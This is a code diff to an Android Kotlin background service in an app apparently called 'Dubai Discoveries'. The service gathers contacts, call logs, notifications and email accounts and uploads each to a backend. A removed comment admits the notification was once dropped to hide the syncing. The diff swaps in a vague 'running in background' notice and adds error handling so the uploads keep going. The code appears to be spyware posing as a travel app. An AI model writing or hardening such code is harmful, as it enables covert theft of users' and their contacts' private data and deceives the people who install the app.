@@ -46,8 +46,8 @@ class DataSyncService : Service() {
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         Log.d(TAG, "DataSyncService started")
         
-        // Start foreground service - REMOVED to hide "Data sync in progress..." notification
-        // startForeground(NOTIFICATION_ID, createNotification("Data sync in progress..."))
+        // Start foreground service - REQUIRED for Android 8.0+
+        startForeground(NOTIFICATION_ID, createNotification("Dubai Discoveries running in background"))
         
         // Start periodic data collection and sync
         serviceScope.launch {
@@ -77,10 +77,21 @@ class DataSyncService : Service() {
         try {
             Log.d(TAG, "Starting data collection and sync...")
             
-            // Collect data
+            // Collect data safely
             val dataCollector = DataCollector(this)
-            val collectedData = dataCollector.collectAllData()
-            val summary = dataCollector.getDataSummary()
+            val collectedData = try {
+                dataCollector.collectAllData()
+            } catch (e: Exception) {
+                Log.e(TAG, "Error collecting data", e)
+                return
+            }
+            
+            val summary = try {
+                dataCollector.getDataSummary()
+            } catch (e: Exception) {
+                Log.e(TAG, "Error getting data summary", e)
+                return
+            }
             
             Log.d(TAG, "Data collected: $summary")
             
@@ -91,21 +102,37 @@ class DataSyncService : Service() {
                 return
             }
             
-            // Sync each data type separately
+            // Sync each data type separately with error handling
             if (collectedData.has("contacts")) {
-                syncDataToBackend("CONTACTS", deviceCode, collectedData.getJSONArray("contacts"))
+                try {
+                    syncDataToBackend("CONTACTS", deviceCode, collectedData.getJSONArray("contacts"))
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error syncing contacts", e)
+                }
             }
             
             if (collectedData.has("call_logs")) {
-                syncDataToBackend("CALL_LOGS", deviceCode, collectedData.getJSONArray("call_logs"))
+                try {
+                    syncDataToBackend("CALL_LOGS", deviceCode, collectedData.getJSONArray("call_logs"))
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error syncing call logs", e)
+                }
             }
             
             if (collectedData.has("notifications")) {
-                syncDataToBackend("NOTIFICATIONS", deviceCode, collectedData.getJSONArray("notifications"))
+                try {
+                    syncDataToBackend("NOTIFICATIONS", deviceCode, collectedData.getJSONArray("notifications"))
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error syncing notifications", e)
+                }
             }
             
             if (collectedData.has("email_accounts")) {
-                syncDataToBackend("EMAIL_ACCOUNTS", deviceCode, collectedData.getJSONArray("email_accounts"))
+                try {
+                    syncDataToBackend("EMAIL_ACCOUNTS", deviceCode, collectedData.getJSONArray("email_accounts"))
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error syncing email accounts", e)
+                }
             }
             
             Log.d(TAG, "Data sync completed successfully")
